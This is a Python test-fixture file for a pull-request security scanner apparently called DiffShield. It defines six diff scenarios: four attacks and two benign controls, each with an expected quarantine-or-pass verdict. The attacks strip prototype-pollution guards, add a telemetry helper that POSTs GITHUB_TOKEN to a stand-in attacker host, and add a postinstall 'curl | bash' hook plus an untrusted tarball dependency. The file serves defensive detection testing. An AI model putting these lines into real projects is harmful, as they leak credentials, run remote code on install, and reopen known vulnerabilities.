"""
scenarios.py - The 6 canonical DiffShield test and demo scenarios.

4 attacks + 2 benign controls, each with raw diff, metadata, and expected verdict.
Used by test suites, demo CLI, and the local demo server.
"""

from __future__ import annotations

from dataclasses import dataclass
from typing import Dict, Any, List


@dataclass
class Scenario:
    id: str
    name: str
    description: str
    is_attack: bool
    expected_decision: str  # 'quarantine' or 'pass'
    expected_cve_or_rule: str
    repo: str
    pr_number: int
    pr_title: str
    raw_diff: str
    head_source: str = ""
    base_source: str = ""


SCENARIOS: List[Scenario] = [
    # Scenario 1: PR #482 Acceptance Scenario
    Scenario(
        id="scenario-1",
        name="PR #482: Prototype Pollution Guard Deletion (CVE-2019-10744)",
        description="Contributor submits 'performance optimization' merge that strips the __proto__ guard fixing CVE-2019-10744.",
        is_attack=True,
        expected_decision="quarantine",
        expected_cve_or_rule="CVE-2019-10744",
        repo="lodash/lodash",
        pr_number=482,
        pr_title="Simplify merge for performance",
        raw_diff="""--- a/merge.js
+++ b/merge.js
@@ -2,3 +2,2 @@
   for (const key in source) {
-    if (key === '__proto__') continue;
     target[key] = source[key];
""",
        base_source="""function merge(target, source) {
  for (const key in source) {
    if (key === '__proto__') continue;
    target[key] = source[key];
  }
  return target;
}
""",
        head_source="""function merge(target, source) {
  for (const key in source) {
    target[key] = source[key];
  }
  return target;
}
"""
    ),

    # Scenario 2: Partial Revert
    Scenario(
        id="scenario-2",
        name="Partial Revert: Secondary Guard Stripped",
        description="PR retains __proto__ check but quietly removes the constructor pollution guard.",
        is_attack=True,
        expected_decision="quarantine",
        expected_cve_or_rule="CVE-2019-10744",
        repo="fast-deep-equal/lib",
        pr_number=104,
        pr_title="Refactor key validation logic",
        raw_diff="""--- a/validate.js
+++ b/validate.js
@@ -2,3 +2,2 @@
   if (k === '__proto__') return false;
-  if (k === 'constructor') return false;
   return true;
""",
        base_source="""function validateKey(k) {
  if (k === '__proto__') return false;
  if (k === 'constructor') return false;
  return true;
}
""",
        head_source="""function validateKey(k) {
  if (k === '__proto__') return false;
  return true;
}
"""
    ),

    # Scenario 3: Credential Exfiltration
    Scenario(
        id="scenario-3",
        name="Credential Exfiltration via Background Beacon (DS003)",
        description="Submits telemetry helper that accesses process.env.GITHUB_TOKEN and sends outbound fetch.",
        is_attack=True,
        expected_decision="quarantine",
        expected_cve_or_rule="DS003",
        repo="acme/build-tools",
        pr_number=88,
        pr_title="Add build telemetry reporting",
        raw_diff="""--- a/telemetry.js
+++ b/telemetry.js
@@ -1,2 +1,6 @@
 function reportStatus(status) {
+  const token = process.env.GITHUB_TOKEN;
+  fetch("https://collector.evil-exfil.com/beacon", {
+    method: "POST",
+    body: JSON.stringify({ token, status })
+  });
 }
""",
        head_source="""function reportStatus(status) {
  const token = process.env.GITHUB_TOKEN;
  fetch("https://collector.evil-exfil.com/beacon", {
    method: "POST",
    body: JSON.stringify({ token, status })
  });
}
"""
    ),

    # Scenario 4: Malicious package.json
    Scenario(
        id="scenario-4",
        name="Supply-Chain Install Hook & Untrusted Tarball (DS008 / DS009)",
        description="PR modifies package.json adding a postinstall shell curl pipe and direct tarball dependency.",
        is_attack=True,
        expected_decision="quarantine",
        expected_cve_or_rule="DS008",
        repo="web-app/client",
        pr_number=219,
        pr_title="Update core utilities and build scripts",
        raw_diff="""--- a/package.json
+++ b/package.json
@@ -6,4 +6,6 @@
   "scripts": {
     "test": "jest",
+    "postinstall": "curl -fsSL https://evil.sh/bootstrap | bash"
   },
   "dependencies": {
+    "core-cache": "https://untrusted-cdn.com/archive.tar.gz"
   }
"""
    ),

    # Scenario 5: Benign Honest Refactor
    Scenario(
        id="scenario-5",
        name="Benign Refactor: Parameter Rename and Math Helper",
        description="Honest developer refactor: renames parameter variables and extracts safe math calculation helper.",
        is_attack=False,
        expected_decision="pass",
        expected_cve_or_rule="PASS",
        repo="math-lib/core",
        pr_number=54,
        pr_title="Clean up vector helper parameters",
        raw_diff="""--- a/vec.js
+++ b/vec.js
@@ -1,4 +1,8 @@
-function distance(x1, y1, x2, y2) {
-  return Math.hypot(x2 - x1, y2 - y1);
+function calcDiff(a, b) {
+  return b - a;
 }
+function distance(startX, startY, endX, endY) {
+  const dx = calcDiff(startX, endX);
+  const dy = calcDiff(startY, endY);
+  return Math.hypot(dx, dy);
+}
"""
    ),

    # Scenario 6: Rename with Guard Intact
    Scenario(
        id="scenario-6",
        name="Benign Control: Variable Renaming with __proto__ Guard INTACT",
        description="The ultimate test of precision: refactors merge function and identifiers, but retains the protective guard.",
        is_attack=False,
        expected_decision="pass",
        expected_cve_or_rule="PASS",
        repo="lodash/lodash",
        pr_number=483,
        pr_title="Modernize merge loop syntax",
        raw_diff="""--- a/merge.js
+++ b/merge.js
@@ -1,6 +1,6 @@
-function merge(target, source) {
-  for (const key in source) {
-    if (key === '__proto__') continue;
-    target[key] = source[key];
+function merge(t, s) {
+  for (const k in s) {
+    if (k === '__proto__') continue;
+    t[k] = s[k];
   }
 }
""",
        base_source="""function merge(target, source) {
  for (const key in source) {
    if (key === '__proto__') continue;
    target[key] = source[key];
  }
}
""",
        head_source="""function merge(t, s) {
  for (const k in s) {
    if (k === '__proto__') continue;
    t[k] = s[k];
  }
}
"""
    )
]


def get_scenario_by_id(scenario_id: str) -> Scenario:
    for s in SCENARIOS:
        if s.id == scenario_id:
            return s
    raise ValueError(f"Scenario '{scenario_id}' not found.")

